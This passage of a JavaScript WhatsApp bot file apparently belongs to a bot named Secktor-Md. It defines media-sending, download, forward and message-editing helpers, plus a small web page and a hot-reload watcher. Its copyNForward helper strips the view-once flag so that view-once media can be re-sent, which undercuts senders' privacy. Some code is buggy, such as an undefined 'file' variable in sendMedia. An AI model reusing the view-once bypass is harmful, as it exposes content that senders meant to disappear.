		 * @param {*} quoted
		 * @param {*} options
		 * @returns
		 */
		sock.sendVideoAsSticker = async (jid, buff, options = {}) => {
			let buffer;
			if (options && (options.packname || options.author)) {
				buffer = await writeExifVid(buff, options);
			} else {
				buffer = await videoToWebp(buff);
			}
			await sock.sendMessage(
				jid,
				{ sticker: { url: buffer }, ...options },
				options,
			);
		};

		//========================================================================================================================================
		sock.sendMedia = async (
			jid,
			path,
			fileName = '',
			caption = '',
			quoted = '',
			options = {},
		) => {
			let types = await sock.getFile(path, true);
			let { mime, ext, res, data, filename } = types;
			if ((res && res.status !== 200) || file.length <= 65536) {
				try {
					throw { json: JSON.parse(file.toString()) };
				} catch (e) {
					if (e.json) throw e.json;
				}
			}
			let type = '',
				mimetype = mime,
				pathFile = filename;
			if (options.asDocument) type = 'document';
			if (options.asSticker || /webp/.test(mime)) {
				let { writeExif } = require('./exif');
				let media = { mimetype: mime, data };
				pathFile = await writeExif(media, {
					packname: options.packname
						? options.packname
						: Config.packname,
					author: options.author
						? options.author
						: Config.author,
					categories: options.categories
						? options.categories
						: [],
				});
				await fs.promises.unlink(filename);
				type = 'sticker';
				mimetype = 'image/webp';
			} else if (/image/.test(mime)) type = 'image';
			else if (/video/.test(mime)) type = 'video';
			else if (/audio/.test(mime)) type = 'audio';
			else type = 'document';
			await sock.sendMessage(
				jid,
				{
					[type]: { url: pathFile },
					caption,
					mimetype,
					fileName,
					...options,
				},
				{ quoted, ...options },
			);
			return fs.promises.unlink(pathFile);
		};
		/**
		 *
		 * @param {*} message
		 * @param {*} filename
		 * @param {*} attachExtension
		 * @returns
		 */
		//========================================================================================================================================
		sock.downloadAndSaveMediaMessage = async (
			message,
			filename,
			attachExtension = true,
		) => {
			let quoted = message.msg ? message.msg : message;
			let mime = (message.msg || message).mimetype || '';
			let messageType = message.mtype
				? message.mtype.replace(/Message/gi, '')
				: mime.split('/')[0];
			const stream = await downloadContentFromMessage(
				quoted,
				messageType,
			);
			let buffer = Buffer.from([]);
			for await (const chunk of stream) {
				buffer = Buffer.concat([buffer, chunk]);
			}
			let type = await FileType.fromBuffer(buffer);
			trueFileName = attachExtension
				? filename + '.' + type.ext
				: filename;
			// save to file
			await fs.writeFileSync(trueFileName, buffer);
			return trueFileName;
		};
		//========================================================================================================================================
		sock.downloadMediaMessage = async message => {
			let mime = (message.msg || message).mimetype || '';
			let messageType = message.mtype
				? message.mtype.replace(/Message/gi, '')
				: mime.split('/')[0];
			const stream = await downloadContentFromMessage(
				message,
				messageType,
			);
			let buffer = Buffer.from([]);
			for await (const chunk of stream) {
				buffer = Buffer.concat([buffer, chunk]);
			}

			return buffer;
		};

		/**
		 *
		 * @param {*} jid
		 * @param {*} message
		 * @param {*} forceForward
		 * @param {*} options
		 * @returns
		 */
		//========================================================================================================================================
		sock.copyNForward = async (
			jid,
			message,
			forceForward = false,
			options = {},
		) => {
			let vtype;
			if (options.readViewOnce) {
				message.message =
					message.message &&
					message.message.ephemeralMessage &&
					message.message.ephemeralMessage.message
						? message.message.ephemeralMessage.message
						: message.message || undefined;
				vtype = Object.keys(
					message.message.viewOnceMessage.message,
				)[0];
				delete (message.message && message.message.ignore
					? message.message.ignore
					: message.message || undefined);
				delete message.message.viewOnceMessage.message[vtype]
					.viewOnce;
				message.message = {
					...message.message.viewOnceMessage.message,
				};
			}

			let mtype = Object.keys(message.message)[0];
			let content = await generateForwardMessageContent(
				message,
				forceForward,
			);
			let ctype = Object.keys(content)[0];
			let context = {};
			if (mtype != 'conversation')
				context = message.message[mtype].contextInfo;
			content[ctype].contextInfo = {
				...context,
				...content[ctype].contextInfo,
			};
			const waMessage = await generateWAMessageFromContent(
				jid,
				content,
				options
					? {
							...content[ctype],
							...options,
							...(options.contextInfo
								? {
										contextInfo: {
											...content[ctype]
												.contextInfo,
											...options.contextInfo,
										},
								  }
								: {}),
					  }
					: {},
			);
			await sock.relayMessage(jid, waMessage.message, {
				messageId: waMessage.key.id,
			});
			return waMessage;
		};
		sock.sendFileUrl = async (
			jid,
			url,
			caption,
			quoted,
			options = {},
		) => {
			let mime = '';
			let res = await axios.head(url);
			mime = res.headers['content-type'];
			if (mime.split('/')[1] === 'gif') {
				return sock.sendMessage(
					jid,
					{
						video: await getBuffer(url),
						caption: caption,
						gifPlayback: true,
						...options,
					},
					{ quoted: quoted, ...options },
				);
			}
			let type = mime.split('/')[0] + 'Message';
			if (mime === 'application/pdf') {
				return sock.sendMessage(
					jid,
					{
						document: await getBuffer(url),
						mimetype: 'application/pdf',
						caption: caption,
						...options,
					},
					{ quoted: quoted, ...options },
				);
			}
			if (mime.split('/')[0] === 'image') {
				return sock.sendMessage(
					jid,
					{
						image: await getBuffer(url),
						caption: caption,
						...options,
					},
					{ quoted: quoted, ...options },
				);
			}
			if (mime.split('/')[0] === 'video') {
				return sock.sendMessage(
					jid,
					{
						video: await getBuffer(url),
						caption: caption,
						mimetype: 'video/mp4',
						...options,
					},
					{ quoted: quoted, ...options },
				);
			}
			if (mime.split('/')[0] === 'audio') {
				return sock.sendMessage(
					jid,
					{
						audio: await getBuffer(url),
						caption: caption,
						mimetype: 'audio/mpeg',
						...options,
					},
					{ quoted: quoted, ...options },
				);
			}
		};

		//========================================================================================================================================
		sock.cMod = (
			jid,
			copy,
			text = '',
			sender = sock.user.id,
			options = {},
		) => {
			//let copy = message.toJSON()
			let mtype = Object.keys(copy.message)[0];
			let isEphemeral = mtype === 'ephemeralMessage';
			if (isEphemeral) {
				mtype = Object.keys(
					copy.message.ephemeralMessage.message,
				)[0];
			}
			let msg = isEphemeral
				? copy.message.ephemeralMessage.message
				: copy.message;
			let content = msg[mtype];
			if (typeof content === 'string') msg[mtype] = text || content;
			else if (content.caption)
				content.caption = text || content.caption;
			else if (content.text) content.text = text || content.text;
			if (typeof content !== 'string')
				msg[mtype] = {
					...content,
					...options,
				};
			if (copy.key.participant)
				sender = copy.key.participant =
					sender || copy.key.participant;
			else if (copy.key.participant)
				sender = copy.key.participant =
					sender || copy.key.participant;
			if (copy.key.remoteJid.includes('@s.whatsapp.net'))
				sender = sender || copy.key.remoteJid;
			else if (copy.key.remoteJid.includes('@broadcast'))
				sender = sender || copy.key.remoteJid;
			copy.key.remoteJid = jid;
			copy.key.fromMe = sender === sock.user.id;

			return proto.WebMessageInfo.fromObject(copy);
		};

		/**
		 *
		 * @param {*} path
		 * @returns
		 */
		//========================================================================================================================================
		sock.getFile = async (PATH, save) => {
			let res;
			let data = Buffer.isBuffer(PATH)
				? PATH
				: /^data:.*?\/.*?;base64,/i.test(PATH)
				? Buffer.from(PATH.split`,`[1], 'base64')
				: /^https?:\/\//.test(PATH)
				? await (res = await getBuffer(PATH))
				: fs.existsSync(PATH)
				? ((filename = PATH), fs.readFileSync(PATH))
				: typeof PATH === 'string'
				? PATH
				: Buffer.alloc(0);
			//if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
			let type = (await FileType.fromBuffer(data)) || {
				mime: 'application/octet-stream',
				ext: '.bin',
			};
			let filename = path.join(
				__filename,
				__dirname + new Date() * 1 + '.' + type.ext,
			);
			if (data && save) fs.promises.writeFile(filename, data);
			return {
				res,
				filename,
				size: await getSizeMedia(data),
				...type,
				data,
			};
		};
		//========================================================================================================================================
		sock.sendFile = async (
			jid,
			PATH,
			fileName,
			quoted = {},
			options = {},
		) => {
			let types = await sock.getFile(PATH, true);
			let { filename, size, ext, mime, data } = types;
			let type = '',
				mimetype = mime,
				pathFile = filename;
			if (options.asDocument) type = 'document';
			if (options.asSticker || /webp/.test(mime)) {
				let { writeExif } = require('./exif.js');
				let media = { mimetype: mime, data };
				pathFile = await writeExif(media, {
					packname: Config.packname,
					author: Config.packname,
					categories: options.categories
						? options.categories
						: [],
				});
				await fs.promises.unlink(filename);
				type = 'sticker';
				mimetype = 'image/webp';
			} else if (/image/.test(mime)) type = 'image';
			else if (/video/.test(mime)) type = 'video';
			else if (/audio/.test(mime)) type = 'audio';
			else type = 'document';
			await sock.sendMessage(
				jid,
				{
					[type]: { url: pathFile },
					mimetype,
					fileName,
					...options,
				},
				{ quoted, ...options },
			);
			return fs.promises.unlink(pathFile);
		};
		//========================================================================================================================================
		sock.parseMention = async text => {
			return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(
				v => v[1] + '@s.whatsapp.net',
			);
		};

		return sock;
	}

	syncdb().catch(err => console.log(err));
	const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Secktor-Md</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Hello from SamPandey001!
    </section>
  </body>
</html>
`;
	app.get('/', (req, res) => res.type('html').send(html));
	app.listen(port, () =>
		console.log(
			`Secktor Server listening on port http://localhost:${port}!`,
		),
	);
	//=============================[to get message of New Update of this file.]===================================================
	let file = require.resolve(__filename);
	fs.watchFile(file, () => {
		fs.unwatchFile(file);
		console.log(`Update ${__filename}`);
		delete require.cache[file];
		require(file);
	});
}, 3000);

function atob(str) {
	return Buffer.from(str, 'base64').toString('binary');
}

let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file);
	console.log(`Update '${__filename}'`);
	delete require.cache[file];
	require(file);
});
